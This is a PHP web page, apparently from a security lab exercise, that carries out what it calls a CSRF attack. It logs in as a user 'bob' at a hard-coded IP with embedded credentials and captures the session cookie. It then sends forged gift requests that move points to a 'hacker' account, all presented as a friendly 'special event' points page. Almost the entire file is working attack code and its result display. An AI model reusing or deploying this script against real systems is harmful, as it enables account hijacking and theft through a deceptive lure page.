<?php
session_start();

class SmartCSRFAttacker {
    private $target_base = 'http://3.35.218.180';
    private $login_url;
    private $profile_url;
    private $session_cookies = '';
    private $hacker_id = '13';
    
    public function __construct() {
        $this->login_url = $this->target_base . '/login.php';
        $this->profile_url = $this->target_base . '/profile.php';
    }
    
    // Bob으로 자동 로그인
    public function loginAsBob() {
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $this->login_url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query([
                'username' => 'bob',
                'password' => 'bobby123'
            ]),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => false, // 리다이렉트 따라가지 않음
            CURLOPT_HEADER => true, // 헤더 포함
            CURLOPT_TIMEOUT => 15,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/x-www-form-urlencoded',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            ]
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        // 세션 쿠키 추출
        if (preg_match('/Set-Cookie:\s*([^;]+)/i', $response, $matches)) {
            $this->session_cookies = $matches[1];
        }
        
        // PHPSESSID 추출 (다른 방법)
        if (preg_match('/PHPSESSID=([^;]+)/i', $response, $matches)) {
            $this->session_cookies = 'PHPSESSID=' . $matches[1];
        }
        
        $login_success = ($http_code == 302 || 
                         strpos($response, 'profile') !== false ||
                         strpos($response, 'logout') !== false ||
                         !empty($this->session_cookies));
        
        return [
            'success' => $login_success,
            'http_code' => $http_code,
            'cookies' => $this->session_cookies,
            'response_preview' => substr(strip_tags($response), 0, 200)
        ];
    }
    
    // CSRF 공격 실행
    public function executeCSRFAttacks() {
        if (empty($this->session_cookies)) {
            return ['error' => '세션 쿠키가 없습니다. 먼저 로그인하세요.'];
        }
        
        $attacks = [
            ['points' => 30, 'gift_type' => 'coffee', 'message' => '어 개털렸죠?'],
            ['points' => 25, 'gift_type' => 'cake', 'message' => '내가 가져간다 이 대머리야']
        ];
        
        $results = [];
        
        foreach ($attacks as $i => $attack) {
            $result = $this->sendAttackRequest($attack, $i + 1);
            $results[] = $result;
            
            usleep(1000000); // 1초 대기
        }
        
        return $results;
    }
    
    private function sendAttackRequest($attack, $attackNum) {
        $ch = curl_init();
        
        $post_data = http_build_query([
            'receiver_id' => $this->hacker_id,
            'points' => $attack['points'],
            'send_gift' => '1',
            'gift_type' => $attack['gift_type'],
            'message' => $attack['message']
        ]);
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $this->profile_url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $post_data,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_COOKIE => $this->session_cookies, // 세션 쿠키 사용
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/x-www-form-urlencoded',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Referer: ' . $this->profile_url
            ]
        ]);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        // 성공 판정
        $success = false;
        if ($response && $http_code == 200) {
            $success = (strpos($response, '선물') !== false || 
                       strpos($response, '전송') !== false ||
                       strpos($response, 'success') !== false ||
                       (strpos($response, '<!DOCTYPE html>') !== false && 
                        strpos($response, 'error') === false));
        }
        
        return [
            'attack_num' => $attackNum,
            'points' => $attack['points'],
            'gift_type' => $attack['gift_type'],
            'success' => $success,
            'http_code' => $http_code,
            'response_preview' => substr($response, 0, 300),
            'error' => $error,
            'timestamp' => date('H:i:s')
        ];
    }
}

// 실행 로직
$attacker = new SmartCSRFAttacker();
$login_result = null;
$attack_results = null;
$total_success = 0;
$total_points = 0;

if ($_POST && isset($_POST['execute_full_attack'])) {
    // 1단계: Bob으로 로그인
    $login_result = $attacker->loginAsBob();
    
    if ($login_result['success']) {
        // 2단계: CSRF 공격 실행
        $attack_results = $attacker->executeCSRFAttacks();
        
        if (!isset($attack_results['error'])) {
            foreach ($attack_results as $result) {
                if ($result['success']) {
                    $total_success++;
                    $total_points += $result['points'];
                }
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 특별 이벤트 - PHP 자동화 시스템</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
        }
        .title { font-size: 2.5em; text-align: center; margin-bottom: 30px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .phase { background: rgba(255,255,255,0.1); padding: 20px; border-radius: 15px; margin: 20px 0; }
        .phase h3 { color: #FFD700; margin-bottom: 15px; }
        .success { color: #00FF88; }
        .failed { color: #FF6B6B; }
        .warning { color: #FFA500; }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            font-size: 1.2em;
            cursor: pointer;
            display: block;
            margin: 20px auto;
            transition: all 0.3s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        .log-entry { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px; margin: 10px 0; font-family: monospace; }
        .stats { background: rgba(0,255,136,0.1); padding: 20px; border-radius: 15px; border: 1px solid rgba(0,255,136,0.3); }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title">🎁 PHP 자동화 포인트 지급 시스템</h1>
        
        <?php if (!$login_result): ?>
        <!-- 시작 화면 -->
        <div class="phase">
            <h3>🚀 자동화 시스템 준비 완료</h3>
            <p>서버에서 안전하고 빠르게 포인트를 지급해드립니다</p>
            
            <div style="margin: 20px 0; padding: 15px; background: rgba(0,0,0,0.2); border-radius: 10px;">
                <h4>📋 시스템 정보</h4>
                <p>• <strong>자동 로그인:</strong> bob 계정으로 자동 인증</p>
                <p>• <strong>지급 대상:</strong> hacker (ID: 13)</p>
                <p>• <strong>지급 포인트:</strong> 55P (30P + 25P)</p>
                <p>• <strong>처리 방식:</strong> PHP cURL + 세션 관리</p>
                <p>• <strong>예상 시간:</strong> 3-5초</p>
            </div>
            
            <form method="POST">
                <input type="hidden" name="execute_full_attack" value="1">
                <button type="submit" class="btn">🎯 자동 포인트 지급 시작</button>
            </form>
        </div>
        
        <?php else: ?>
        <!-- 결과 화면 -->
        
        <!-- 1단계: 로그인 결과 -->
        <div class="phase">
            <h3>🔐 1단계: 자동 로그인</h3>
            <div class="log-entry">
                <div class="<?php echo $login_result['success'] ? 'success' : 'failed'; ?>">
                    <?php echo $login_result['success'] ? '✅' : '❌'; ?> 
                    Bob 계정 로그인: <?php echo $login_result['success'] ? '성공' : '실패'; ?>
                </div>
                <div style="font-size: 0.9em; opacity: 0.8; margin-top: 5px;">
                    HTTP 코드: <?php echo $login_result['http_code']; ?><br>
                    세션 쿠키: <?php echo $login_result['cookies'] ? $login_result['cookies'] : '없음'; ?><br>
                    응답: <?php echo htmlspecialchars(substr($login_result['response_preview'], 0, 100)); ?>...
                </div>
            </div>
        </div>
        
        <?php if ($login_result['success'] && $attack_results): ?>
        <!-- 2단계: 공격 결과 -->
        <div class="phase">
            <h3>💸 2단계: 포인트 지급</h3>
            
            <?php if (isset($attack_results['error'])): ?>
            <div class="log-entry failed">
                ❌ 오류: <?php echo $attack_results['error']; ?>
            </div>
            
            <?php else: ?>
            <?php foreach ($attack_results as $result): ?>
            <div class="log-entry">
                <div class="<?php echo $result['success'] ? 'success' : 'failed'; ?>">
                    [<?php echo $result['timestamp']; ?>] 
                    <?php echo $result['success'] ? '✅' : '❌'; ?> 
                    지급 <?php echo $result['attack_num']; ?>: 
                    <?php echo $result['points']; ?>P 
                    (<?php echo $result['gift_type']; ?>) 
                    <?php echo $result['success'] ? '성공' : '실패'; ?>
                </div>
                
                <div style="font-size: 0.8em; opacity: 0.7; margin-top: 5px;">
                    HTTP: <?php echo $result['http_code']; ?> | 
                    응답: <?php echo htmlspecialchars(substr($result['response_preview'], 0, 80)); ?>...
                </div>
            </div>
            <?php endforeach; ?>
            <?php endif; ?>
        </div>
        
        <!-- 최종 결과 -->
        <div class="stats">
            <h3>🎉 최종 결과</h3>
            <p><strong>로그인:</strong> <span class="success">✅ 성공</span></p>
            <p><strong>성공한 지급:</strong> <?php echo $total_success; ?>/<?php echo count($attack_results); ?></p>
            <p><strong>지급된 포인트:</strong> <?php echo $total_points; ?>P</p>
            <p><strong>성공률:</strong> <?php echo $attack_results ? round(($total_success/count($attack_results))*100, 1) : 0; ?>%</p>
            <p><strong>수혜자:</strong> hacker (ID: 13)</p>
            
            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.2);">
                <h4>🔍 확인 방법</h4>
                <p>1. <a href="http://3.35.218.180" target="_blank" style="color: #00FF88;">http://3.35.218.180</a>에 hacker로 로그인</p>
                <p>2. 포인트 <?php echo $total_points; ?>P 증가 확인</p>
                <p>3. bob 계정에서 포인트 감소 확인</p>
            </div>
        </div>
        
        <?php else: ?>
        <div class="phase failed">
            <h3>❌ 로그인 실패</h3>
            <p>Bob 계정 로그인에 실패했습니다. 서버 상태를 확인해주세요.</p>
        </div>
        <?php endif; ?>
        
        <?php endif; ?>
    </div>

    <script>
        console.log('🎯 PHP 자동화 시스템 로드 완료');
        
        <?php if ($login_result): ?>
        console.log('🔐 로그인 결과:', <?php echo json_encode($login_result); ?>);
        
        <?php if ($attack_results && !isset($attack_results['error'])): ?>
        console.log('💸 공격 결과:', <?php echo json_encode($attack_results); ?>);
        console.log('📊 최종 통계: 성공 <?php echo $total_success; ?>/<?php echo count($attack_results); ?>, 포인트 <?php echo $total_points; ?>P');
        <?php endif; ?>
        <?php endif; ?>
    </script>
</body>
</html>
